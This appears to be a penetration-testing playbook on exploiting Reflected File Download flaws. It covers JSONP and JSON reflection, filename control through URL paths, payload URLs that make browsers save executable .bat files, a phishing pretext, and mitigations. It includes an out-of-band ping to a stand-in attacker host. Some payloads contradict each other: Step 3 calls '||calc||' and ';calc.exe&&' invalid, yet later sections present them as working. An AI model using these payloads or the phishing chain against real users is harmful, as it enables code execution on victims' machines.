---
name: performing-reflected-file-download
description: Identifying and exploiting Reflected File Download (RFD) where an endpoint reflects attacker-controlled
  input into a downloadable response with an attacker-controlled filename and extension, enabling command execution
  on the victim's machine when the file is run.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- rfd
- reflected-file-download
- json
- jsonp
- content-disposition
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Performing Reflected File Download

## When to Use

- During authorized penetration tests of applications that reflect user input into responses (especially JSON/JSONP APIs)
- When an endpoint accepts a value (callback, query param, search term, username) and echoes it into the response body
- When the URL path or a parameter can control the *filename* and *extension* the browser uses when saving the response
- For validating that downloads are forced to safe filenames/extensions and proper `Content-Disposition` handling
- During bug bounty programs targeting RFD, which chains reflection + content-disposition + permissive routing into client-side command execution

## Prerequisites

- **Authorization**: Written penetration testing agreement covering social-engineering/client-side payloads
- **A modern browser matrix**: RFD behavior depends on browser download handling (test Chrome, Edge, and IE-derived behaviors)
- **A controlled victim VM (Windows)**: To safely detonate `.bat`/`.cmd` payloads
- **Burp Suite or curl**: For crafting requests and inspecting `Content-Type`/`Content-Disposition`
- **Understanding of the three RFD conditions**: reflection, filename control, and permissive content handling

## Critical: Checks Most Often Missed

RFD requires three conditions to line up; testers miss it because each looks
harmless alone. Confirm all three, then weaponize:

- **(1) Reflection of raw input into the body.** The endpoint must echo your
  input largely unescaped — JSON APIs and JSONP callbacks are prime, e.g.
  `{"q":"<your input>"}` or `yourCallback({...})`. The reflection does not need
  to be HTML; it just needs to start the file with valid shell content.
- **(2) Filename + extension control via the URL.** Browsers often derive the
  saved filename from the *last path segment*. Append a path suffix like
  `/setup.bat` or use `;/filename.bat`, `%2Ffilename.bat`, or a
  `download=...bat` param. Test whether the trailing path is ignored by routing
  but used by the browser for the filename — the classic RFD gap.
- **(3) Permissive content handling.** Missing or weak `Content-Disposition`
  (no `filename=` / not `attachment`), `Content-Type: application/json` served
  without `nosniff`, or any setup that lets the browser save the response as an
  executable extension.
- **Leading command callback in the reflection.** The reflected value must be
  *first* on the line so the `.bat` is valid, e.g. prefix with `||calc||` or
  `;calc.exe&&` — `{"q":"||calc||..."}` ignores the JSON wrapper as a label and
  runs your command.
- **JSONP callback is the cleanest sink.** `?callback=||calc||` yields
  `||calc||({...})` which, saved as `data.bat`, executes `calc`. Always probe the
  `callback`/`jsonp`/`cb`/`func` parameter.
- **Batched commands & quoting.** Chain with `&`, `&&`, `|`, `||` and quote to
  survive the reflected JSON punctuation, e.g.
  `||calc&&ping%20attacker||` to prove arbitrary execution.
- **`X-Content-Type-Options: nosniff` is NOT a full fix.** It mitigates some
  cases but RFD still works when the filename/extension is attacker-controlled
  and the user runs the file. The real fix is forced filenames + `attachment`.
- **Confirm in a browser, not just curl.** The vulnerability is the *browser's*
  save-as-name and the user running it — curl confirms reflection and headers,
  but detonation must be validated by actually downloading and executing.

## Workflow

### Step 1: Find Reflective Endpoints

Locate endpoints that echo input into the response body.

```bash
# Hunt for reflection in JSON / JSONP / API responses through Burp history.
# Inject a unique marker and grep for it verbatim in the response:
MARK="rfdMARK1337"

curl -s "https://target.example.com/api/search?q=$MARK" | grep -o "$MARK"
curl -s "https://target.example.com/api/profile?name=$MARK" | grep -o "$MARK"

# JSONP callbacks are ideal — the callback name is reflected at the very start:
curl -s "https://target.example.com/api/data?callback=$MARK" | head -c 200
# Expect: rfdMARK1337({"status":"ok", ...})

# Note the response headers (this decides exploitability):
curl -s -D - "https://target.example.com/api/data?callback=$MARK" -o /dev/null
# Inspect: Content-Type, Content-Disposition, X-Content-Type-Options
```

### Step 2: Test Filename / Extension Control

Determine whether the browser will save the response with an attacker-chosen executable name.

```bash
# (a) Trailing path segment — does routing ignore /anything.bat while the
#     browser uses it as the download filename?
curl -s -D - "https://target.example.com/api/data/setup.bat?callback=foo" -o /dev/null
#   200 OK with the same body => path suffix ignored by app, used by browser

# (b) Matrix/semicolon and encoded-slash variants:
https://target.example.com/api/data;/setup.bat?callback=foo
https://target.example.com/api/data%2Fsetup.bat?callback=foo
https://target.example.com/api/data/x.bat;jsessionid=1?callback=foo

# (c) A download/filename parameter, if present:
https://target.example.com/export?download=invoice.bat&q=foo

# (d) Check Content-Disposition: if it sets a fixed safe filename you are
#     blocked; if absent or attacker-influenced, RFD is viable:
curl -s -D - "https://target.example.com/api/data/setup.bat?callback=foo" \
  -o /dev/null | grep -i content-disposition
```

### Step 3: Craft the Leading-Command Reflection

Make the reflected input the first bytes of a valid Windows batch file.

```text
# JSONP: test whether a callback can place a VALID batch command first.
# Use an inert marker and comment out the response suffix:
https://target.example.com/api/data/setup.bat?callback=echo%20RFD_ORACLE_MARKER%26rem%20

# Resulting downloaded file (setup.bat) content:
#   echo RFD_ORACLE_MARKER&rem ({"status":"ok", ... })
# The leading echo runs; rem treats the JSONP suffix as a comment.
# A leading || has no left operand and fails with a cmd.exe syntax error.

# Reflected-search variant where input lands inside JSON:
https://target.example.com/api/search/report.bat?q=;calc.exe&&
# File content:
#   {"q":";calc.exe&& ...","results":[]}
# This JSON reflection does NOT by itself form a valid Windows batch command.
# Semicolon is not a cmd.exe command separator; quoting/context must be proven.

# Batched commands to prove arbitrary execution (use benign markers):
?callback=echo%20RFD_ORACLE_MARKER%26rem%20
# decoded: echo RFD_ORACLE_MARKER&rem
```

### Step 4: Confirm Download Behavior in a Browser

Validate that the browser saves the attacker-named file and that it executes.

```text
# On the victim VM, open the crafted URL in the target browser:
https://target.example.com/api/data/setup.bat?callback=||calc||

# Observe:
#  - The download is offered as "setup.bat" (attacker-controlled name)
#  - Content-Disposition does not force a safe name / extension
#  - Running the downloaded setup.bat launches calc.exe

# Record the browser + version, since download-naming heuristics differ:
#  - Chrome/Edge: filename from final path segment when no C-D filename
#  - IE/legacy:   historically the most permissive for RFD
```

### Step 5: Build the Delivery / Social-Engineering Chain

Demonstrate realistic impact: a link that appears to originate from the trusted domain.

```text
# The exploit URL is on the TRUSTED target domain, which is what makes RFD
# convincing — the victim sees target.example.com and a familiar-looking file.

Phishing pretext example:
  "Download your invoice: https://target.example.com/api/data/Invoice_2024.bat?callback=||calc||"

# Optional: URL-encode the payload and use a shortener-free, on-domain link so
# URL filters and the user both trust the origin. Document the full kill chain:
#   trusted-domain link -> browser saves Invoice_2024.bat -> user runs it ->
#   leading command executes -> attacker code runs in the user's context.
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Reflection** | The endpoint echoes attacker input into the response body (JSON/JSONP ideal) |
| **Filename control** | Browser derives the saved filename from a path segment or parameter the attacker sets |
| **Permissive content** | Missing/weak `Content-Disposition` or sniffable `Content-Type` allows saving as `.bat`/`.cmd` |
| **Leading command** | Reflected value placed first so the file is a valid batch script (`||calc||`, `;calc.exe&&`) |
| **JSONP sink** | `?callback=` reflects at the very start of the body, the cleanest RFD primitive |
| **Trusted-origin delivery** | The exploit URL is on the real target domain, increasing victim trust |
| **Batched commands** | `&`, `&&`, `\|`, `\|\|` chain multiple commands within the reflected line |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Discover reflection points, tamper paths/params, inspect response headers |
| **curl** | Confirm reflection, filename routing, and `Content-Disposition`/`Content-Type` headers |
| **Chrome / Edge / legacy IE** | Validate browser-specific download naming and execution behavior |
| **Windows victim VM** | Safely detonate `.bat`/`.cmd` payloads and confirm command execution |
| **Burp Collaborator / interactsh** | Confirm batched command callbacks (`ping`/`nslookup` to OOB host) |

## Common Scenarios

### Scenario 1: JSONP API RFD
An analytics endpoint `/api/data?callback=...` reflects the callback at the start of the response. Requesting `/api/data/update.bat?callback=||calc||` causes the browser to save `update.bat`; running it executes `calc.exe` in the victim's context.

### Scenario 2: Search Reflection with Path-Based Filename
A search API reflects `q` into JSON and ignores trailing path segments. `/api/search/report.bat?q=;powershell ...&&` downloads `report.bat` whose leading command runs a PowerShell cradle.

### Scenario 3: Missing Content-Disposition on Export
An export endpoint returns JSON with no `Content-Disposition`. The attacker controls the path filename, so `/export/Statement.cmd?...` saves as an executable that runs on double-click.

### Scenario 4: Permissive Routing + nosniff Present
Even with `X-Content-Type-Options: nosniff`, attacker-controlled filename/extension plus user execution yields RFD, because the user runs the file regardless of MIME sniffing.

## Output Format

```
## Reflected File Download Finding

**Vulnerability**: Reflected File Download (RFD)
**Severity**: High (CVSS 7.5)
**Location**: GET /api/data/{filename}.bat?callback=...
**OWASP Category**: A03:2021 - Injection (client-side command execution)

### Reproduction Steps
1. Confirm reflection: GET /api/data?callback=rfdMARK1337 echoes the callback at body start
2. Confirm filename control: GET /api/data/setup.bat?callback=foo returns 200 with same body
3. Confirm headers: no Content-Disposition: attachment with a fixed filename
4. Weaponize: open https://target.example.com/api/data/setup.bat?callback=||calc|| in Chrome
5. Browser saves setup.bat; executing it launches calc.exe

### Conditions Met
| Condition | Status | Evidence |
|-----------|--------|----------|
| Reflection of input | Yes | callback echoed verbatim at body start |
| Filename/extension control | Yes | /setup.bat path segment used as download name |
| Permissive content handling | Yes | no attachment Content-Disposition; sniffable type |

### Downloaded File Content (setup.bat)
||calc||({"status":"ok","data":[]})

### Impact
- Arbitrary command execution on the victim's machine when the file is run
- Delivery from the trusted target.example.com origin defeats user URL scrutiny
- Batched commands confirmed via OOB callback (ping to attacker.oob.example)

### Recommendation
1. Force downloads with Content-Disposition: attachment; filename="data.json"
   and a fixed, safe extension the application controls.
2. Reject or sanitize trailing path segments and download/filename parameters.
3. Refuse callback/JSONP names that are not strict identifiers
   (^[a-zA-Z_$][a-zA-Z0-9_$]*$); disable JSONP in favor of CORS where possible.
4. Set Content-Type: application/json and X-Content-Type-Options: nosniff.
5. Prefix reflected JSON bodies with an anti-execution guard
   (e.g. )]}',\n) so the file is never a valid script.
```
